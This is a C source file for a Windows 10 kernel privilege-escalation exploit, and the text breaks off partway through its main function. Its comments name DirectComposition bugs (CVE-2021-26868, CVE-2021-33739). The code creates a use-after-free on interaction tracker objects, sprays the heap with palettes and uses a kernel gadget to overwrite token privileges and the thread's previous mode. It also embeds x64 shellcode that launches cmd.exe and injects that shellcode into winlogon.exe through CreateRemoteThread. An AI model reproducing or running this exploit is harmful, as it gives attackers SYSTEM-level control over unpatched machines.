#include <stdio.h>
#include <tchar.h>
#include <windows.h>
#include <strsafe.h>
#include <string>
#include <ntstatus.h>
#include <processthreadsapi.h>
#include <tlhelp32.h>
#include "ntos.h"
#pragma comment(lib, "ntdll.lib")

enum DCPROCESSCOMMANDID
{
 nCmdProcessCommandBufferIterator,
 nCmdCreateResource,
 nCmdOpenSharedResource,
 nCmdReleaseResource,
 nCmdGetAnimationTime,
 nCmdCapturePointer,
 nCmdOpenSharedResourceHandle,
 nCmdSetResourceCallbackId,
 nCmdSetResourceIntegerProperty,
 nCmdSetResourceFloatProperty,
 nCmdSetResourceHandleProperty,
 nCmdSetResourceHandleArrayProperty,
 nCmdSetResourceBufferProperty,
 nCmdSetResourceReferenceProperty,
 nCmdSetResourceReferenceArrayProperty,
 nCmdSetResourceAnimationProperty,
 nCmdSetResourceDeletedNotificationTag,
 nCmdAddVisualChild,
 nCmdRedirectMouseToHwnd,
 nCmdSetVisualInputSink,
 nCmdRemoveVisualChild
};


typedef
NTSTATUS
(NTAPI *_NtDCompositionCreateChannel)(
 OUT PHANDLE pArgChannelHandle,
 IN OUT PSIZE_T pArgSectionSize,
 OUT PVOID* pArgSectionBaseMapInProcess
 );

typedef
NTSTATUS
(NTAPI* _NtDCompositionDestroyChannel)(
 IN HANDLE ChannelHandle
 );


typedef
NTSTATUS
(NTAPI *_NtDCompositionProcessChannelBatchBuffer)(
 IN HANDLE hChannel,
 IN DWORD dwArgStart,
 OUT PDWORD pOutArg1,
 OUT PDWORD pOutArg2);

typedef
NTSTATUS
(NTAPI* _NtDCompositionCommitChannel)(
 IN HANDLE hChannel,
 OUT PDWORD pOutArg1,
 OUT PDWORD pOutArg2,
 IN DWORD flag,
 IN HANDLE Object);

typedef
NTSTATUS
(NTAPI* _NtDCompositionCreateSynchronizationObject)(
 void** a1
 );


typedef NTSTATUS(WINAPI* _NtQuerySystemInformation)(
 SYSTEM_INFORMATION_CLASS SystemInformationClass,
 PVOID SystemInformation,
 ULONG SystemInformationLength,
 PULONG ReturnLength);

typedef NTSTATUS(NTAPI* _NtWriteVirtualMemory)(
 HANDLE ProcessHandle,
 void* BaseAddress,
 const void* SourceBuffer,
 size_t Length,
 size_t* BytesWritten);

typedef struct _EXPLOIT_CONTEXT {
 PPEB pPeb;
 _NtQuerySystemInformation fnNtQuerySystemInformation;
 _NtWriteVirtualMemory fnNtWriteVirtualMemory;

 HANDLE hCurProcessHandle;
 HANDLE hCurThreadHandle;
 DWORD64 dwKernelEprocessAddr;
 DWORD64 dwKernelEthreadAddr;

 DWORD previous_mode_offset;
 
 DWORD win32_process_offset; // EPROCESS->Win32Process

 DWORD GadgetAddrOffset;
 DWORD ObjectSize;
}EXPLOIT_CONTEXT, * PEXPLOIT_CONTEXT;

PEXPLOIT_CONTEXT g_pExploitCtx;

SIZE_T GetObjectKernelAddress(PEXPLOIT_CONTEXT pCtx, HANDLE object)
{
 PSYSTEM_HANDLE_INFORMATION_EX handleInfo = NULL;
 ULONG handleInfoSize = 0x1000;
 ULONG retLength;
 NTSTATUS status;
 SIZE_T kernelAddress = 0;
 BOOL bFind = FALSE;

 while (TRUE)
 {
  handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)LocalAlloc(LPTR, handleInfoSize);

  status = pCtx->fnNtQuerySystemInformation(SystemExtendedHandleInformation, handleInfo, handleInfoSize, &retLength);

  if (status == 0xC0000004 || NT_SUCCESS(status)) // STATUS_INFO_LENGTH_MISMATCH
  {
   LocalFree(handleInfo);

   handleInfoSize = retLength + 0x100;
   handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)LocalAlloc(LPTR, handleInfoSize);

   status = pCtx->fnNtQuerySystemInformation(SystemExtendedHandleInformation, handleInfo, handleInfoSize, &retLength);

   if (NT_SUCCESS(status))
   {
    for (ULONG i = 0; i < handleInfo->NumberOfHandles; i++)
    {
     if ((USHORT)object == 0x4)
     {
      if (0x4 == (DWORD)handleInfo->Handles[i].UniqueProcessId && (SIZE_T)object == (SIZE_T)handleInfo->Handles[i].HandleValue)
      {
       kernelAddress = (SIZE_T)handleInfo->Handles[i].Object;
       bFind = TRUE;
       break;
      }
     }
     else
     {
      if (GetCurrentProcessId() == (DWORD)handleInfo->Handles[i].UniqueProcessId && (SIZE_T)object == (SIZE_T)handleInfo->Handles[i].HandleValue)
      {
       kernelAddress = (SIZE_T)handleInfo->Handles[i].Object;
       bFind = TRUE;
       break;
      }
     }
    }
   }

  }

  if (handleInfo)
   LocalFree(handleInfo);

  if (bFind)
   break;
 }

 return kernelAddress;
}

void WriteMemory(void* dst, const void* src, size_t size)
{
 size_t num_bytes_written;
 g_pExploitCtx->fnNtWriteVirtualMemory(GetCurrentProcess(), dst, src, size, &num_bytes_written);
}

DWORD64 ReadPointer(void* address)
{
 DWORD64 value;
 WriteMemory(&value, address, sizeof(DWORD64));
 return value;
}

void WritePointer(void* address, DWORD64 value)
{
 WriteMemory(address, &value, sizeof(DWORD64));
}

BOOL InitEnvironment()
{
 g_pExploitCtx = new EXPLOIT_CONTEXT;

 g_pExploitCtx->fnNtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtQuerySystemInformation");
 g_pExploitCtx->fnNtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtWriteVirtualMemory");

 g_pExploitCtx->pPeb = NtCurrentTeb()->ProcessEnvironmentBlock;

 if (!DuplicateHandle(GetCurrentProcess(), GetCurrentProcess(), GetCurrentProcess(), &g_pExploitCtx->hCurProcessHandle, 0, FALSE, DUPLICATE_SAME_ACCESS) ||
  !DuplicateHandle(GetCurrentProcess(), GetCurrentThread(), GetCurrentProcess(), &g_pExploitCtx->hCurThreadHandle, 0, FALSE, DUPLICATE_SAME_ACCESS))
  return FALSE;

 g_pExploitCtx->dwKernelEprocessAddr = GetObjectKernelAddress(g_pExploitCtx, g_pExploitCtx->hCurProcessHandle);
 g_pExploitCtx->dwKernelEthreadAddr = GetObjectKernelAddress(g_pExploitCtx, g_pExploitCtx->hCurThreadHandle);

 if (g_pExploitCtx->pPeb->OSMajorVersion < 10)
 {
  return FALSE;
 }

 if (g_pExploitCtx->pPeb->OSBuildNumber < 17763 || g_pExploitCtx->pPeb->OSBuildNumber > 19042)
 {
  return FALSE;
 }

 switch (g_pExploitCtx->pPeb->OSBuildNumber)
 {
  case 18362:
  case 18363:
   g_pExploitCtx->win32_process_offset = 0x3b0;
   g_pExploitCtx->previous_mode_offset = 0x232;
   g_pExploitCtx->GadgetAddrOffset = 0x50;
   g_pExploitCtx->ObjectSize = 0x1a0;
   break;
  case 19041:
  case 19042:
   g_pExploitCtx->win32_process_offset = 0x508;
   g_pExploitCtx->previous_mode_offset = 0x232;
   g_pExploitCtx->GadgetAddrOffset = 0x38;
   g_pExploitCtx->ObjectSize = 0x1d0;
   break;
  default:
   break;
 }
 printf("[+] OS Build Number: %d\n", g_pExploitCtx->pPeb->OSBuildNumber);
 printf("[+] Win32 Process offset: 0x%x\n", g_pExploitCtx->win32_process_offset);
 printf("[+] Previous mode offset: 0x%x\n", g_pExploitCtx->previous_mode_offset);
 printf("[+] Gadget address offset: 0x%x\n",g_pExploitCtx->GadgetAddrOffset);
 printf("[+] Object size: 0x%x %d\n", g_pExploitCtx->ObjectSize, g_pExploitCtx->ObjectSize);;

 return TRUE;
}

DWORD64 where;

HPALETTE createPaletteofSize1(int size) {  // size = 0x1a0 (416)
 int pal_cnt = (size + 0x8c - 0x90) / 4;  // (size - 0x04) / 4 = 103 (0x67)
 int palsize = sizeof(LOGPALETTE) + (pal_cnt - 1) * sizeof(PALETTEENTRY); // 8 + 102 * 4 = 416
 // LOGPALETTE(2+2+4= 8 bytes), PALETTEENTRY(1+1+1+1= 4 bytes)
 LOGPALETTE* lPalette = (LOGPALETTE*)malloc(palsize); // 416 bytes
 DWORD64* p = (DWORD64*)((DWORD64)lPalette + 4);   // p = lPalette[4]
 memset(lPalette, 0xff, palsize); // lPalette Heap spray

 /*
 printf("\n[+] Before setting lPalette: %p\n", lPalette);
 for (int i = 0; i < 0x30; i++) {
  if (i % 4 == 0) {
   puts("");
  }
  printf("%p ", *(lPalette + i));
 }
 puts("");
 */

 //p[0] = (DWORD64)0xffffffff;  // address of refcnt ???
 p[0] = (DWORD64)0x11223344;
 p[3] = (DWORD64)0x04;   // fake handle id, maybe tracker3
 p[9] = g_pExploitCtx->dwKernelEthreadAddr + g_pExploitCtx->previous_mode_offset - 9 - 8; // Set kernel previous mode offset
 // 0x232 - 9 - 8 = 0x221
 // _ETHREAD + 0x221 = DisablePageFaultClustering ???

 lPalette->palNumEntries = pal_cnt;
 lPalette->palVersion = 0x300;

 /*
 printf("\n[+] After setting lPalette: %p\n", lPalette);
 for(int i = 0; i < 0x80; i++) {
  if (i % 16 == 0) {
   puts("");
  }
  printf("%02X ", *(BYTE*)((DWORD64)lPalette + i));
 }
 puts("");
 getchar();
 */

 return CreatePalette(lPalette);
}

HPALETTE createPaletteofSize2(int size) {  // size = 0x1a0 (416)
 int pal_cnt = (size + 0x8c - 0x90) / 4;  // pal_cnt = 103 (0x67)
 int palsize = sizeof(LOGPALETTE) + (pal_cnt - 1) * sizeof(PALETTEENTRY); // palsize = 416 (0x1a0)
 // LOGPALETTE(2+2+4= 8 bytes), PALETTEENTRY(1+1+1+1= 4 bytes)
 LOGPALETTE* lPalette = (LOGPALETTE*)malloc(palsize); // 416 bytes
 DWORD64* p = (DWORD64*)((DWORD64)lPalette + 4);   // p = lPalette[4]
 memset(lPalette, 0xff, palsize); // lPalette Heap spray

 //p[0] = (DWORD64)0xffffffff;  // address of refcnt ???
 p[0] = (DWORD64)0x11223344;
 p[3] = (DWORD64)0x04;   // fake handle id, maybe tracker3
 p[9] = where - 8 + 3;   // p[9] = kernel access token address
 
 lPalette->palNumEntries = pal_cnt;
 lPalette->palVersion = 0x300;

 return CreatePalette(lPalette);
}


// CVE-2019-1215 Exploit
// run cmd.exe
unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51" \
"\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52" \
"\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0" \
"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed" \
"\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88" \
"\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44" \
"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48" \
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1" \
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44" \
"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49" \
"\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a" \
"\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41" \
"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00" \
"\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b" \
"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff" \
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47" \
"\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64\x2e\x65" \
"\x78\x65\x00";

static const unsigned int shellcode_len = 0x1000;

 

#define MAXIMUM_FILENAME_LENGTH 255
#define SystemModuleInformation  0xb
#define SystemHandleInformation 0x10

void InjectToWinlogon()
{
 PROCESSENTRY32 entry; // Entry for list of the processes
 entry.dwSize = sizeof(PROCESSENTRY32);

 HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
 // Take snapshot including all processes in system

 // Find & Get Winlogon process id
 int pid = -1;
 if (Process32First(snapshot, &entry)) // Enumerate processes using Process32First
 {
  while (Process32Next(snapshot, &entry)) // Look each process
  {
   if (wcscmp(entry.szExeFile, L"winlogon.exe") == 0) // if process name == winlogon.exe
   {
    pid = entry.th32ProcessID;      // Get pid of winlogon.exe
    break;
   }
  }
 }

 CloseHandle(snapshot);

 if (pid < 0)
 {
  printf("Could not find process\n");
  return;
 }

 // Get Winlogon process handle
 HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
 if (!h)
 {
  printf("Could not open process: %x", GetLastError());
  return;
 }

 // Memory allocation in Winlogon to inject shellcode
 void* buffer = VirtualAllocEx(h, NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 if (!buffer)
 {
  printf("[-] VirtualAllocEx failed\n");
 }

 if (!buffer)
 {
  printf("[-] remote allocation failed");
  return;
 }

 // Inject shellcode on allocated memory
 if (!WriteProcessMemory(h, buffer, shellcode, sizeof(shellcode), 0))
 {
  printf("[-] WriteProcessMemory failed");
  return;
 }

 // Execute shellcode by creating thread and running it in Winlogon
 HANDLE hthread = CreateRemoteThread(h, 0, 0, (LPTHREAD_START_ROUTINE)buffer, 0, 0, 0);

 if (hthread == INVALID_HANDLE_VALUE)
 {
  printf("[-] CreateRemoteThread failed");
  return;
 }
}


#define TOKEN_OFFSET 0x40   //_SEP_TOKEN_PRIVILEGES offset

HMODULE GetNOSModule()
{
 HMODULE hKern = 0;
 hKern = LoadLibraryEx(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
 return hKern;
}

DWORD64 GetModuleAddr(const char* modName)
{
 PSYSTEM_MODULE_INFORMATION buffer = (PSYSTEM_MODULE_INFORMATION)malloc(0x20);

 DWORD outBuffer = 0;
 NTSTATUS status = g_pExploitCtx->fnNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, buffer, 0x20, &outBuffer);

 if (status == STATUS_INFO_LENGTH_MISMATCH)
 {
  free(buffer);
  buffer = (PSYSTEM_MODULE_INFORMATION)malloc(outBuffer);
  status = g_pExploitCtx->fnNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, buffer, outBuffer, &outBuffer);
 }

 if (!buffer)
 {
  printf("[-] NtQuerySystemInformation error\n");
  return 0;
 }

 for (unsigned int i = 0; i < buffer->NumberOfModules; i++)
 {
  PVOID kernelImageBase = buffer->Modules[i].ImageBase;
  PCHAR kernelImage = (PCHAR)buffer->Modules[i].FullPathName;
  if (_stricmp(kernelImage, modName) == 0)
  {
   free(buffer);
   return (DWORD64)kernelImageBase;
  }
 }
 free(buffer);
 return 0;
}


DWORD64 GetKernelPointer(HANDLE handle, DWORD type)
{
 PSYSTEM_HANDLE_INFORMATION buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(0x20);

 DWORD outBuffer = 0;
 NTSTATUS status = g_pExploitCtx->fnNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, 0x20, &outBuffer);

 if (status == STATUS_INFO_LENGTH_MISMATCH)
 {
  free(buffer);
  buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(outBuffer);
  status = g_pExploitCtx->fnNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, outBuffer, &outBuffer);
 }

 if (!buffer)
 {
  printf("[-] NtQuerySystemInformation error \n");
  return 0;
 }

 for (size_t i = 0; i < buffer->NumberOfHandles; i++)
 {
  DWORD objTypeNumber = buffer->Handles[i].ObjectTypeIndex; // non-use variable

  // Check args(handle = token, type = 0x05) with SYSTEM HANDLE TABLE ENTRY INFO
  if (buffer->Handles[i].UniqueProcessId == GetCurrentProcessId() && buffer->Handles[i].ObjectTypeIndex == type)
  {
   if (handle == (HANDLE)buffer->Handles[i].HandleValue)
   {
    DWORD64 object = (DWORD64)buffer->Handles[i].Object; // Get System Handle
    free(buffer);
    return object;
   }
  }
 }
 printf("[-] handle not found\n");
 free(buffer);
 return 0;
}

DWORD64 GetGadgetAddr(const char* name)
{
 DWORD64 base = GetModuleAddr("\\SystemRoot\\system32\\ntoskrnl.exe");
 HMODULE mod = GetNOSModule(); // Get ntoskrnl module
 if (!mod)
 {
  printf("[-] leaking ntoskrnl version\n");
  return 0;
 }
 DWORD64 offset = (DWORD64)GetProcAddress(mod, name); // name = SeSetAccessStateGenericMapping
 DWORD64 returnValue = base + offset - (DWORD64)mod;
 //printf("[+] FunAddr: %p\n", (DWORD64)returnValue);
 FreeLibrary(mod);
 return returnValue;
}

DWORD64 PsGetCurrentCProcessData()
{
 DWORD64 dwWin32ProcessAddr = ReadPointer((void*)( g_pExploitCtx->dwKernelEprocessAddr + g_pExploitCtx->win32_process_offset) );
 return ReadPointer((void*)(dwWin32ProcessAddr + 0x100));
}

void RestoreStatus()
{
 DWORD64 dwCGenericTableAddr = ReadPointer((void *)PsGetCurrentCProcessData());

 WritePointer((void*)dwCGenericTableAddr, 0);
 WritePointer((void*)( dwCGenericTableAddr + 8 ), 0);
 WritePointer((void*)(dwCGenericTableAddr + 16), 0);

 byte value = 1;
 WriteMemory((void*)(g_pExploitCtx->dwKernelEthreadAddr + g_pExploitCtx->previous_mode_offset), &value, sizeof(byte));
 // Set kernel previous mode to user mode (1)
}


int main(int argc, TCHAR* argv[])
{
 HANDLE hChannel;
 NTSTATUS ntStatus;
 SIZE_T SectionSize = 0x500000;
 PVOID pMappedAddress = NULL;
 DWORD dwArg1, dwArg2;

 // Set exploit values and check vulnerable Windows build number
 if (!InitEnvironment()) {
  printf("[-] Inappropriate Operating System\n");
  return 0;
 }

 LoadLibrary(TEXT("user32")); // Call win32kbase.sys

 // Allocate memory at address 0xffffffff
 //LPVOID pV = VirtualAlloc((LPVOID)0xffffffff, 0x100000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
 LPVOID pV = VirtualAlloc((LPVOID)0x11223344, 0x100000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
 if (!pV)
 {
  printf("[-] Failed to allocate memory at address 0x11223344, please try again!\n");
  return 0;
 }
 //DWORD64* Ptr = (DWORD64*)0xffffffff;
 DWORD64* Ptr = (DWORD64*)0x11223344;
 DWORD64 GadgetAddr = GetGadgetAddr("SeSetAccessStateGenericMapping"); // Get ROP Gadget addr of 16 bytes write capability
 // nt!SeSetAccessStateGenericMapping Gadget looks like:
 // mov  rax, [rcx + 48h]
 // movups xmm0, xmmword ptr [rdx]
 // movdqu xmmword ptr [rax + 8], xmm0
 // xmmword size: 128 bits == 16 bytes
 // ??? Forge function pointer to point tracker3 ??? not sure

 printf("[+] found SeSetAccessStateGenericMapping addr at: %p\n", (DWORD64)GadgetAddr);

 memset(Ptr, 0xff, 0x1000); // Heap spray

 printf("\n[+] Before setting gadget address in 0x11223344 + GadgetAddrOffset\n");
 for (int i = 0; i < 0x10; i++) {
  if (i % 4 == 0) {
   puts("");
  }
  printf("%p ", *(Ptr + i));
 }
 puts("");

 *(DWORD64*)((DWORD64)Ptr + g_pExploitCtx->GadgetAddrOffset ) = GadgetAddr; // Set ROP Gadget addr
 // GadgetAddrOffset = 0x50 or 0x38 different by Windows build number
 // Current Environment: Windows 10 Version 1903 (OS build 18362)
 // So, GadgetAddrOffset = 0x50

 printf("\n[+] After setting gadget address in 0x11223344 + GadgetAddrOffset\n");
 for (int i = 0; i < 0x10; i++) {
  if (i % 4 == 0) {
   puts("");
  }
  printf("%p ", *(Ptr + i));
 }
 puts("");


 HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId()); // Get current process handle
 if (!proc)
 {
  printf("[-] OpenProcess failed\n");
  return 0;
 }
 HANDLE token = 0;
 if (!OpenProcessToken(proc, TOKEN_ADJUST_PRIVILEGES, &token)) // Get access token handle of current process
 {
  printf("[-] OpenProcessToken failed\n");
  return 0;
 }
 // TOKEN_ADJUST_PRIVILEGES: activate or deactivate privileges in Access Token
 
 DWORD64 ktoken = GetKernelPointer(token, 0x5); // Get kernel access token pointer
 where = ktoken + TOKEN_OFFSET;     // where = ktoken + 0x40 = _SEP_TOKEN_PRIVILEGES offset
 printf("\n[+] where: %p\n", where);
 printf("[+] where - 8 + 3: %p\n", where - 8 + 3);


 // Initialize DirectComposition APIs from win32u.dll library
 _NtDCompositionCreateChannel NtDCompositionCreateChannel;
 NtDCompositionCreateChannel = (_NtDCompositionCreateChannel)GetProcAddress(LoadLibrary(L"win32u.dll"), "NtDCompositionCreateChannel");

 _NtDCompositionDestroyChannel NtDCompositionDestroyChannel;
 NtDCompositionDestroyChannel = (_NtDCompositionDestroyChannel)GetProcAddress(LoadLibrary(L"win32u.dll"), "NtDCompositionDestroyChannel");

 _NtDCompositionProcessChannelBatchBuffer NtDCompositionProcessChannelBatchBuffer;
 NtDCompositionProcessChannelBatchBuffer = (_NtDCompositionProcessChannelBatchBuffer)GetProcAddress(LoadLibrary(L"win32u.dll"), "NtDCompositionProcessChannelBatchBuffer");

 _NtDCompositionCommitChannel NtDCompositionCommitChannel;
 NtDCompositionCommitChannel = (_NtDCompositionCommitChannel)GetProcAddress(LoadLibrary(L"win32u.dll"), "NtDCompositionCommitChannel");

 _NtDCompositionCreateSynchronizationObject NtDCompositionCreateSynchronizationObject;
 NtDCompositionCreateSynchronizationObject = (_NtDCompositionCreateSynchronizationObject)GetProcAddress(LoadLibrary(L"win32u.dll"), "NtDCompositionCreateSynchronizationObject");

 void* p = 0;
 ntStatus = NtDCompositionCreateSynchronizationObject(&p);

 // create a new channel
 ntStatus = NtDCompositionCreateChannel(&hChannel, &SectionSize, &pMappedAddress);
 if (!NT_SUCCESS(ntStatus)) {
  printf("Create channel error!\n");
  return -1;
 }


 *(DWORD*)(pMappedAddress) = nCmdCreateResource;
 *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)1;
 *(DWORD*)((PUCHAR)pMappedAddress + 8) = (DWORD)0x59; //DirectComposition::CInteractionTrackerBindingManagerMarshaler
 *(DWORD*)((PUCHAR)pMappedAddress + 0xC) = FALSE;

 printf("\n[+] Binding1 pMappedAddress");
 for (int i = 0; i < 0x10; i++) {
  if (i % 16 == 0) {
   puts("");
  }
  printf("%02X ", *(BYTE*)((DWORD64)pMappedAddress + i));
 }
 puts("");

 ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2); // Create binding


 *(DWORD*)(pMappedAddress) = nCmdCreateResource;
 *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)2;  // tracker1
 *(DWORD*)((PUCHAR)pMappedAddress + 8) = (DWORD)0x58; //DirectComposition::CInteractionTrackerMarshaler
 *(DWORD*)((PUCHAR)pMappedAddress + 0xC) = FALSE;

 printf("\n[+] Tracker1 pMappedAddress");
 for (int i = 0; i < 0x10; i++) {
  if (i % 16 == 0) {
   puts("");
  }
  printf("%02X ", *(BYTE*)((DWORD64)pMappedAddress + i));
 }
 puts("");

 ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2); // Create tracker1


 *(DWORD*)(pMappedAddress) = nCmdCreateResource;
 *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)3;  // tracker2
 *(DWORD*)((PUCHAR)pMappedAddress + 8) = (DWORD)0x58; //DirectComposition::CInteractionTrackerMarshaler
 *(DWORD*)((PUCHAR)pMappedAddress + 0xC) = FALSE;

 printf("\n[+] Tracker2 pMappedAddress");
 for (int i = 0; i < 0x10; i++) {
  if (i % 16 == 0) {
   puts("");
  }
  printf("%02X ", *(BYTE*)((DWORD64)pMappedAddress + i));
 }
 puts("");

 ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2); // Create tracker2


 *(DWORD*)(pMappedAddress) = nCmdCreateResource;
 *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)4;  // tracker3
 *(DWORD*)((PUCHAR)pMappedAddress + 8) = (DWORD)0x58; //DirectComposition::CInteractionTrackerMarshaler
 *(DWORD*)((PUCHAR)pMappedAddress + 0xC) = FALSE;

 printf("\n[+] Tracker3 pMappedAddress");
 for (int i = 0; i < 0x10; i++) {
  if (i % 16 == 0) {
   puts("");
  }
  printf("%02X ", *(BYTE*)((DWORD64)pMappedAddress + i));
 }
 puts("");

 ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2); // Create tracker3
 //
 // set argument of NtDCompositionProcessChannelBatchBuffer
 //

 // CVE-2021-26868 Phase start
 DWORD* szBuff = (DWORD*)malloc(4 * 3);

 // binding->entry_count > 0 ?
 // entry_count == 0  -> Create New TrackEntry1
 szBuff[0] = 0x02;  // tracker1
 szBuff[1] = 0x03;  // tracker2
 szBuff[2] = 0xffff;  // new entry1_id

 *(DWORD*)pMappedAddress = nCmdSetResourceBufferProperty;// 0x0c
 *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)(1); // CInteractionTrackerBindingManagerMarshaler
 *(DWORD*)((PUCHAR)pMappedAddress + 8) = 0;    // subcmd = 0x00
 *(DWORD*)((PUCHAR)pMappedAddress + 0xc) = 12;   // szBuff size = 0x0c
 CopyMemory((PUCHAR)pMappedAddress + 0x10, szBuff, 12); // szBuff[0] = tracker1, szBuff[1] = tracker2, szBuff[2] = entry1_id
 ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10 + 12, &dwArg1, &dwArg2); // Set binding property
 // BindingManager->TrackEntry1  -->  TrackEntry1->tracker1, tracker2, entry1_id  -->  tracker1, 2->BindingManager
 if (ntStatus != 0)
 {
  printf("error!\n");
  return 0;
 }

 // binding->entry_count > 0 ?
 // entry_count == 1  -> Update old TrackEntry1 to TrackerEntry2
 szBuff[0] = 0x02;  // tracker1
 szBuff[1] = 0x03;  // tracker2
 szBuff[2] = 0x0;  // new entry2_id
 // if entry_id == 0, RemoveBindingManagerReferenceFromTrackerIfNeccesary
 // tracker(1,2)->binding == NULL

 *(DWORD*)pMappedAddress = nCmdSetResourceBufferProperty;// 0x0c
 *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)(1); // CInteractionTrackerBindingManagerMarshaler
 *(DWORD*)((PUCHAR)pMappedAddress + 8) = 0;    // subcmd = 0x00
 *(DWORD*)((PUCHAR)pMappedAddress + 0xc) = 12;   // szBuff size = 0x0c
 CopyMemory((PUCHAR)pMappedAddress + 0x10, szBuff, 12); // szBuff[0] = tracker1, szBuff[1] = tracker2, szBuff[2] = entry2_id
 ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10 + 12, &dwArg1, &dwArg2); // Set binding property


 // Release tracker1
 *(DWORD*)pMappedAddress = nCmdReleaseResource;   // 0x03
 *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)2;  // tracker1
 *(DWORD*)((PUCHAR)pMappedAddress + 8) = 8;    // 0x08, maybe size. not necessary
 ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x8, &dwArg1, &dwArg2);
 // tracker1->binding == NULL, so BindingManager->TrackEntry[0] = dangling pointer of tracker1 remains.
 if (ntStatus != 0)
 {
  printf("error!\n");
  return 0;
 }
 for (size_t i = 0; i < 0x5000; i++)
 {
  createPaletteofSize1(g_pExploitCtx->ObjectSize); // Palette object to occupy freed memory
 }
 // Low Fragmentation Heap Algorithm automatically allocate Palette into freed memory (tracker1).

 // Release tracker2
 *(DWORD*)pMappedAddress = nCmdReleaseResource;   // 0x03
 *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)3;  // tracker2
 *(DWORD*)((PUCHAR)pMappedAddress + 8) = 8;    // 0x08, maybe size. not necessary
 ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x8, &dwArg1, &dwArg2);
 // tracker2->binding == NULL, so BindingManager->TrackEntry[1] = dangling pointer of tracker2 remains.
 if (ntStatus != 0)
 {
  printf("error!\n");
  return 0;
 }
 for (size_t i = 0; i < 0x5000; i++)
 {
  createPaletteofSize2(g_pExploitCtx->ObjectSize); // Palette object to ocuppy freed memory
 }
 // Low Fragmentation Heap Algorithm automatically allocate Palette into freed memory (tracker2).


 // CVE-2021-33739 Phase start
 // BindingManager->entry_count > 0 ?
 // entry_count == 1  -> Find tracker3.handle in TrackerEntry2
 // fake tracker3.handle exists -> Update old TrackEntry2 to TrackerEntry3
 // Set tracker3(tracker1)->binding, tracker3(tracker2)->binding
 szBuff[0] = 0x04;  // tracker3
 szBuff[1] = 0x04;  // tracker3
 szBuff[2] = 0xffff;  // new entry3_id

 *(DWORD*)pMappedAddress = nCmdSetResourceBufferProperty;//0x0c
 *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)(1); // CInteractionTrackerBindingManagerMarshaler
 *(DWORD*)((PUCHAR)pMappedAddress + 8) = 0;    // subcmd = 0x00
 *(DWORD*)((PUCHAR)pMappedAddress + 0xc) = 12;   // szBuff size = 0x0c
 CopyMemory((PUCHAR)pMappedAddress + 0x10, szBuff, 12); // szBuff[0] = tracker3, szBuff[1] = tracker3, szBuff[2] = entry3_id
